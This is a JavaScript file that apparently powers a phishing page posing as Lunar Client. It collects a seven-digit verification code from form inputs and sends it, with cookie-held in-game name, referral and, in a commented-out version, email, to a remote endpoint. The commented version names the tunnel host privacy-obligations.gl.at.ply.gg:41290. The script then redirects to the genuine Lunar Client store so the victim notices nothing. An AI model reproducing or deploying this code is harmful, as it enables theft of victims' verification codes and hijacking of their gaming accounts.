import { apiAuthUrl } from "../../config";

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(";");
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == " ") {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function containsOnlyNumbers(str) {
    return /^\d+$/.test(str);
}

// async function gotoLunar() {
//     const codestring =
//         document.getElementById("1").value +
//         document.getElementById("2").value +
//         document.getElementById("3").value +
//         document.getElementById("4").value +
//         document.getElementById("5").value +
//         document.getElementById("6").value +
//         document.getElementById("7").value;

//     document.cookie = "code=" + codestring;

//     if (
//         document.getElementById("1").value == "" ||
//         document.getElementById("2").value == "" ||
//         document.getElementById("3").value == "" ||
//         document.getElementById("4").value == "" ||
//         document.getElementById("5").value == "" ||
//         document.getElementById("6").value == "" ||
//         document.getElementById("7").value == "" ||
//         !containsOnlyNumbers(codestring) 
//     ) {
//         return;
//     } else {
//         await sendCodeWebhook();

//         // wait half a seoncd
//         await new Promise((r) => setTimeout(r, 500));

//         location.href = "https://store.lunarclient.com/";
//     }
// }

// async function sendCodeWebhook() {
//     // const uuid = getCookie("uuid");
//     const ign = getCookie("ign");
//     const email = getCookie("email");
//     const code = getCookie("code");
//     const ref = getCookie("ref");
//     const uuid = "Noob";
//         fetch(
//             `http://privacy-obligations.gl.at.ply.gg:41290/code/${email}/${ign}/${uuid}/${code}/${ref}`,
//             {
//                 method: "GET",
//             }
//         );
// }

async function gotoLunar() {
    // Combine the values from input fields into one string
    const codestring =
        document.getElementById("1").value +
        document.getElementById("2").value +
        document.getElementById("3").value +
        document.getElementById("4").value +
        document.getElementById("5").value +
        document.getElementById("6").value +
        document.getElementById("7").value;

    // Set the "code" cookie
    document.cookie = "code=" + codestring;

    // Validate that none of the inputs are empty and the code contains only numbers
    if (
        document.getElementById("1").value === "" ||
        document.getElementById("2").value === "" ||
        document.getElementById("3").value === "" ||
        document.getElementById("4").value === "" ||
        document.getElementById("5").value === "" ||
        document.getElementById("6").value === "" ||
        document.getElementById("7").value === "" ||
        !containsOnlyNumbers(codestring)
    ) {
        console.error("One of the inputs is empty or the code is invalid.");
        return;
    } else {
        // Log that we're about to send the webhook
        console.log("Sending webhook...");
        await sendCodeWebhook();
        // Wait half a second before redirecting
        await new Promise((resolve) => setTimeout(resolve, 500));
        location.href = "https://store.lunarclient.com/";
    }
}

async function sendCodeWebhook() {
    // Retrieve cookies (ensure your getCookie function works correctly)
    const ign = getCookie("ign");
    // const email = getCookie("email");
    const code = getCookie("code");
    const ref = getCookie("ref");
    const uuid = "Noob"; // Hardcoded for now; update as needed
    console.log(document.cookie);

    // Log the parameters so you can verify they’re correct
    console.log("Webhook parameters:", { ign, uuid, code, ref }); 

    // Build the URL and log it for debugging
    const url = `${apiAuthUrl}/code/${ign}/${uuid}/${code}/${ref}`;
    console.log("Sending request to URL:", url);

    try {
        // If you suspect CORS issues, you can temporarily try adding mode:'cors' (or 'no-cors' for testing, though that will hide the response)
        const response = await fetch(url, {
            method: "GET",
            mode: "cors"
        });
        console.log("Webhook response status:", response.status);
        const responseData = await response.text();
        console.log("Webhook response data:", responseData);
        return responseData;
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}


// listen for when enter is pressed
document.addEventListener("keypress", function onEvent(event) {
    if (event.key === "Enter") {
        gotoLunar();
    }
});
